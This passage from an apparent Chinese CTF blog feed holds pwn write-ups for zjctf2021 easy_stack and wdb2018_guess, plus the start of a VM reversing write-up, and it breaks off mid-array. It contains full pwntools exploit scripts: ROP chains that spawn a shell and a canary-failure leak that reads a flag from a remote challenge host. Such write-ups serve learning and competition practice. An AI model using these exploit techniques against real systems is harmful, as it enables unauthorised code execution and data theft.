class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;code_base:&#x27;</span>+<span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line">sys=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh=libc_addr+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">pop_rdi_ret+=libc_addr<span class="comment">#用的是libc的gadget，用本身的gadget加上code_base即可</span></span><br></pre></td></tr></table></figure><p>这里我关了aslr的调试结果</p><p><img src="/2021/11/06/zjctf2021%20pwn2/4.png" alt="4"></p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>泄露了这三个基址之后，我们就要考虑在哪里劫持程序流了。got表因为开了保护无法劫持，我们只能劫持函数，唯一具有输入功能的就是my_read函数，所以肯定是在这里溢出。我们之前讨论过我们的ptr能劫持的位置是有限制的。</p><p>如果我们把指针刚好劫持在buf-0x100，然后读入0x100字节的数据能否溢出呢？答案当然是可以的，因为buf是main函数的栈顶了，再上去就是其它函数的栈帧了，就算这0x100字节不能碰到buf，那碰到上面函数的返回地址还是可以的。这便是这题的巧妙之处了，这里我想了很久。但是要注意，我们是逐字节输入的，并不是一口气输入完的，所以里面的一些变量不能破坏。这里具体要自己调试了，它中间好像有把循环截止条件的那个数，也就是第三个参数放到栈上，因为我覆盖过去直接就无了，循环直接退出了。还有一个就是jmp 的时候也有用到栈上的地址跳转，因为我使用e覆盖的，然后我那个指令直接就跳到了0xXXXXX65的地方，然后就crash了，所以这个地方大概率是要放上正确的跳转地址的。因为是逐字节填充，所以这里是肯定劫持不了程序的，我们只能尽量不破坏它程序的执行，我们的最终目标其实也就填上那8个字节其它是什么其实无所谓，只要能成功劫持那八个字节，我们就能控制程序流。</p><h3 id="布置rop链"><a href="#布置rop链" class="headerlink" title="布置rop链"></a>布置rop链</h3><p>这题可以执行system(“/bin/sh”)，因此我们先构造rop链。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=...+p64(pop_rdi_ret)+p64(sh)+p64(system_addr)</span><br></pre></td></tr></table></figure><p>pop_rdi_ret的gadget可以使用elf的，也可以用库的，这个看自己心情，我因为一开始没有选择接受程序基址就选择了libc的gadget。因为我们只能劫持八个字节，那么执行了pop_rdi_ret之后程序ret到哪里了呢，我们先画出当时整个栈结构。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">i</span><br><span class="line">main&#x27;s rbp</span><br><span class="line">ret_addr</span><br><span class="line">buf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ptr</span><br><span class="line">size</span><br><span class="line">canary</span><br><span class="line">libc_start_main&#x27;s rbp</span><br><span class="line">ret_addr</span><br></pre></td></tr></table></figure><p>可以看出来，返回地址后面紧跟着的就是buf，buf我们一开始是可控的，但是一开始我们并不知道system和/bin/sh的地址，因此这里我们需要选择把指针恢复填上p64(sh)+p64(system_addr)，这样当劫持my_read函数的时候就会形成rop链。那么接下来要如何把指针劫持回去呢，因为我们用的是\xff字节去填充了最低位，现在我们如果写，将不会从buf的地方开始而是会从(buf_addr|0xff)，这也是一开始选取\xff字节的目的，因为它八个都是1，在最后计算的时候直接或上去就可以了，如果选取其它的可能就要进行一些复杂的运算，比如\xfe字节你可能就得这么写。</p><p>(buf_addr&amp;0xffffffffff00)|0xfe</p><p>这个应该都能理解吧，因为我们是覆盖操作，但是如果覆盖位数都为1就可以直接或上去，不用再&amp;清除低位字节。</p><p>而我们的目标地址在buf_addr+0x100，所以只需要算这个偏移就行了。这偏移也是很好算的，我们从buf_addr|0xff开始写，然后终点是buf_addr+0x100，两个一减就能算出填充字节的位数了，然后再加上buf_addr指针给他写回去。好了之后呢，就是开头放上p64(sh)+p64(system_addr)然后依然要溢出ff字节，不然只能溢出一个字节不足以能肯定改变指针到我们想的地方。所以重复一开始的操作溢出为0xff，然后再劫持到buf_addr-0x100的地方去。</p><p>改回指针并且重写再次溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">offset=stack_addr+<span class="number">8</span>+<span class="number">0x100</span>-((stack_addr+<span class="number">8</span>)|<span class="number">0xff</span>)</span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr+<span class="number">8</span>))<span class="comment">#再次注意一下，我的stack_addr是buf_addr-8</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">0x100</span>,p64(sh)+p64(pop_rdi_ret+<span class="number">1</span>)+p64(sys)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe8</span>+<span class="string">b&#x27;\xff&#x27;</span>)<span class="comment">#这里需要加个ret平衡栈，后面注意到了就知道在这里加一个就行</span></span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr-<span class="number">0xf8</span>))<span class="comment">#就跟改回来是一样的，截图并未执行到这里</span></span><br></pre></td></tr></table></figure><p><img src="/2021/11/06/zjctf2021%20pwn2/5.png" alt="5"></p><h3 id="劫持my-read"><a href="#劫持my-read" class="headerlink" title="劫持my_read"></a>劫持my_read</h3><p>一开始可能想的会有点简单，直接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0xff</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xf8</span>+p64(pop_rdi_ret))<span class="comment">#也是因为这个填充字符选的到位，导致能快速找出错误，所以如果程序退出异常但还能继续执行不妨改一下填充字符哦</span></span><br></pre></td></tr></table></figure><p>但是会发现程序直接死了，这里就来复原一下我复盘时出的问题，先用这个最简单的payload试试看问题出在哪里。</p><p><img src="/2021/11/06/zjctf2021%20pwn2/6.png" alt="6"></p><p>会发现这个指令非常奇奇怪怪，而且rip此时最低那个字节的值是65刚好就是e的ASCII码，再disass一下发现这个函数根本没有指到这个位置上的指令，可以很清楚的知道，这条指令是被分割了，那么我们回溯栈看看，发现我们覆盖了什么导致这个问题。可以看到次时i的值就是0xb8，那么我们就调试到i=0xb7的时候，观察接下来要覆盖的值是什么。</p><p><img src="/2021/11/06/zjctf2021%20pwn2/7.png" alt="7"></p><p>可以发现接下来要覆盖的字节应该就是两个箭头所指的地方，而右边这里刚好有一个在程序的code段的地址，猜测刚刚应该是覆盖了这里的最低位导致的问题。并且我们刚刚的rip错误指向就是0x555555555365，刚好就是那个地址低字节覆盖了0x65字节导致的问题，我们先来观察一下这个地址在哪里。</p><p><img src="/2021/11/06/zjctf2021%20pwn2/8.png" alt="8"></p><p>可以发现刚好在myread中有这么一个地址，那么看到它在read函数下面应该能想到，这个是在调用read的时候保存的返回地址，读完之后改变了这个返回地址导致了出现这个错误。因为在这里调用read返回地址肯定知道就是在函数的这个位置，那么它在code_base上偏移是固定的，算出偏移之后这个地方的8个字节就固定填写这个不要改变了。此时我们的payload变成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=(<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xb8</span>+p64(code_base+<span class="number">0x130a</span>)).ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;e&#x27;</span>)+p64(pop_rdi_ret)</span><br><span class="line">read(<span class="number">0xff</span>,payload)</span><br></pre></td></tr></table></figure><p>但是发现执行着突然退出了，而当时i的值还是0xc8</p><p><img src="/2021/11/06/zjctf2021%20pwn2/9.png" alt="9"></p><p>到底是为什么呢，应该能稍微猜到一点，因为可以看到rsp的那个地方已经填充好了8个e接下来就要向0xff那边填充了，0xff是循环条件的一个值，猜测是因为这个值被覆盖了导致循环提前结束了，那么在长度到0xc8的时候，这个位置应该填上一个p64(0xff)才能过去，然后后面又有一个地址，不难发现它是我们buf_addr的地址，那么这个地址也不应该被覆盖，而应该写回去。同理，下面的i作为循环变量也不应该被覆盖，这个应当能提前预测到的。</p><p>至于这个位置应该写多少呢，可以想想如果i=0的时候写自己应该写多少呢？答案当然是还是写个0才能保证写进去并且i+1。那么这个位置在哪呢，应该不难推测出开始覆盖ret_addr的时候，它的值应当i=0xf8，覆盖之前的rbp时，i=0xf0，那么再往前推，这个值应该是i=0xe8，所以这个地方给上\xe8然后后面一律填0即可。可以看到这次栈溢出注意的东西也是非常多的，可以说这题目出的也是相当好的。</p><p>最后就没什么讲究了，覆盖上ret_addr为pop_rdi_ret的gadget就能直接getshell。下面是完整payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xb8</span>+p64(code_base+<span class="number">0x130a</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0xff</span>)+p64(stack_addr-<span class="number">0xf8</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xe8</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read(<span class="number">0xff</span>,payload+<span class="string">b&#x27;\xe8&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_ret))</span><br></pre></td></tr></table></figure><p><img src="/2021/11/06/zjctf2021%20pwn2/10.png" alt="10"></p><p>能稳定getsehll，但是前提是aslr关了，aslr关了调试其实是非常舒服的，因为面对复杂的情况有时候可能不能getshell，就比如前面举过的例子，程序基址的最高字节非\x55，buf_addr的最低字节过大，目前已知就这两种情况会导致无法正常getshell。</p><p>这里还需要注意一点，因为关了aslr，我们前面的接受泄露的地址是用的p.recvuntil(b’\x55’*4)[-6:]，关了之后要把后面那个4去掉，这里因为识别单个字节，不排除会识别错误，这个随机加载谁说的清楚呢，这都是小问题。下面给出我开了aslr的运行结果。</p><p><img src="/2021/11/06/zjctf2021%20pwn2/11.png" alt="11"></p><p>如果希望能一把梭，那么可以把攻击的部分作为一个函数，然后主函数while 1 try except这样玩，但是要注意给开头四个recvuntil都加上一个参数timeout=0.5，这样它接收不到这个字节超过0.5秒就会停止接收，后面就会产生报错，报错之后自己会重新运行一遍。注意下面给的exp并没有加上这个，但是加的方法已经告诉你了。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">size,payload</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">b&#x27;sentence&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./easy_stack&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./easy_stack&#x27;</span>)</span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000026b72</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b myread&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+<span class="string">b&#x27;\xff&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)</span><br><span class="line">stack_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x218</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x270b3</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">code_base=u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;code_base:&#x27;</span>+<span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line">sys=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh=libc_addr+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">pop_rdi_ret+=libc_addr</span><br><span class="line"></span><br><span class="line">offset=stack_addr+<span class="number">8</span>+<span class="number">0x100</span>-((stack_addr+<span class="number">8</span>)|<span class="number">0xff</span>)</span><br><span class="line"><span class="comment">#success(&#x27;a&#x27;*offset)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">read(<span class="number">0x100</span>,p64(sh)+p64(pop_rdi_ret+<span class="number">1</span>)+p64(sys)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe8</span>+<span class="string">b&#x27;\xff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr-<span class="number">0xf8</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xb8</span>+p64(code_base+<span class="number">0x130a</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0xff</span>)+p64(stack_addr-<span class="number">0xf8</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xe8</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read(<span class="number">0xff</span>,payload+<span class="string">b&#x27;\xe8&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_ret))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;这题在比赛是没有做出来的，属于赛后复盘，但是感觉这题不该在比赛做不出来，因为赛后花了两小时就出了。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>wdb2018_guess writeup</title>
    <link href="http://example.com/2021/11/04/wdb2018_guess%20writeup/"/>
    <id>http://example.com/2021/11/04/wdb2018_guess%20writeup/</id>
    <published>2021-11-04T03:00:00.000Z</published>
    <updated>2021-11-11T13:03:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>buu刷题记录：<a href="https://buuoj.cn/challenges#wdb2018_guess">wdb2018_guess</a></p><span id="more"></span><h2 id="静态分析elf文件"><a href="#静态分析elf文件" class="headerlink" title="静态分析elf文件"></a>静态分析elf文件</h2><p>checksec一下发现开了NX和canary保护，64位程序，用ida分析看看</p><p>很明显的gets栈溢出，并且gets之后没有回显输入的内容，那这样的话意味着不能栈溢出劫持控制流了。那么看看前面，发现有一个把flag文件内容读到栈上面的动作。后面while循环调用了一个sub_400A11函数，v7=3，v6=0,，v7&gt;=v6 break就意味着这个函数会被调用三次。而发现sub_400A11函数是调用fork函数，fork函数会创建和当前进程一模一样的进程，然后范围自身进程的ID，如果是被创建的进程，那么fork将会返回0。</p><p>简单点就是fork的子进程会返回0，如果返回0那么break执行下面的内容，父进程因为返回自己进程号不会break则继续循环，然后调用fork，也就是说这个进程一共会产生3个子进程执行while循环之后的内容。</p><p>这里有一个特性，那就是在发生栈溢出之后stack_chk_fail。在终止程序之前还会打印argv[0]，这一点很合理。但是这里可以用于泄露栈上的flag，我们如果gets覆盖到argv[0]，就可以任意地址泄露了，但是因为只有三个子进程，就只能泄露三次，前两次一定要把栈地址泄露出来。但是呢现在栈地址是不知道的，我们可以先通过一次泄露泄露出libc的地址，二次泄露出栈地址，最后一次泄露flag。其实这里还有一点不太理解，就是fork之后栈是共享的嘛？libc是共享的很好理解，栈共享就不是很好理解了，还是说它栈不同，只是对应偏移的地方都有flag，然后我泄露的是别的进程上面的flag，倾向于这种解释。</p><h2 id="动态调试确定偏移"><a href="#动态调试确定偏移" class="headerlink" title="动态调试确定偏移"></a>动态调试确定偏移</h2><p>现在就需要知道这个buf到底需要多少字节能覆盖argv[0]，所以需要动调一波。断点下在fork循环之后，这里我选择了0x400b0d的位置，r。为了确定buf的位置，我们选择gets读入很多个a看看它与argv[0]之间的偏移。</p><p><img src="/2021/11/04/wdb2018_guess%20writeup/1.png" alt="1"></p><p>很容易可以从左边看出来，他们之间差了0x128个字节，那么payload就是0x128*b’a’+p64(要泄露内容的地址)。</p><p>第一次拿下libc之后第二次应该要拿__environ，这个我也是看writeup知道的，这个好像就是指向argv[0]的地址。也就是栈上的地址，这个是在libc里面的，所以拿到libc之后就可以泄露这个，然后再观察泄露的地址和flag的地址差多少，确定好偏移之后第三次就可以直接泄露flag了，这里测试之后是0x168的偏移，泄露的地址再减去0x168就是我们想要的flag了。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">libc_version=<span class="string">&#x27;2.23&#x27;</span></span><br><span class="line">libc_in_local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port=<span class="number">9999</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(context.arch)==<span class="string">&#x27;amd64&#x27;</span>:bit=<span class="number">64</span></span><br><span class="line">    <span class="keyword">else</span>:bit=<span class="number">32</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-&#x27;</span>+libc_version+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">str</span>(bit)+<span class="string">&#x27;.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,port)</span><br><span class="line">        <span class="keyword">if</span> libc_in_local:libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:libc=ELF(<span class="string">&#x27;./libc/libc-&#x27;</span>+libc_version+<span class="string">&#x27;-buu&#x27;</span>+<span class="built_in">str</span>(bit)+<span class="string">&#x27;.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_addr</span>(<span class="params">payload</span>):</span></span><br><span class="line">    p.recvline()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;*** stack smashing detected ***: &#x27;</span>)</span><br><span class="line">    addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./GUESS&#x27;</span>,<span class="number">29108</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">libc_addr = leak_addr(payload1)-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_Addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(libc_addr+libc.sym[<span class="string">&#x27;__environ&#x27;</span>])</span><br><span class="line">stack_addr = leak_addr(payload2)-<span class="number">0x168</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">payload3=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(stack_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>成功getflag</p><p><img src="/2021/11/04/wdb2018_guess%20writeup/2.png" alt="2"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;buu刷题记录：&lt;a href=&quot;https://buuoj.cn/challenges#wdb2018_guess&quot;&gt;wdb2018_guess&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>网鼎杯2020青龙组singal writeup</title>
    <link href="http://example.com/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/"/>
    <id>http://example.com/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/</id>
    <published>2021-11-03T02:00:00.000Z</published>
    <updated>2021-11-11T13:03:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>不知不觉做到了虚拟机逆向了，曾经我也只是听说，还未曾想也能自己做出。</p><span id="more"></span><h2 id="静态分析文件"><a href="#静态分析文件" class="headerlink" title="静态分析文件"></a>静态分析文件</h2><p>exe文件，先查壳，没有壳直接ida打开。</p><p><img src="/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/1.png" alt="1"></p><p>main函数逻辑还是比较简单的，先拷贝一串内存给v4，v4再作为第一个参数给vm_operad函数，第二个参数是114。</p><p>那么我们先提取它拷贝的内存，至于这段内存如何使用那就进去分析vm_operad函数了。很明显，这个第一个参数是int*类型的，并且也没有对a1做强制转换之类的关系，那么很明显这个内存是一个int数组，那么用提取成char数组之后再用int *类型去输出它就能得到对应的int数组。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> s[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span 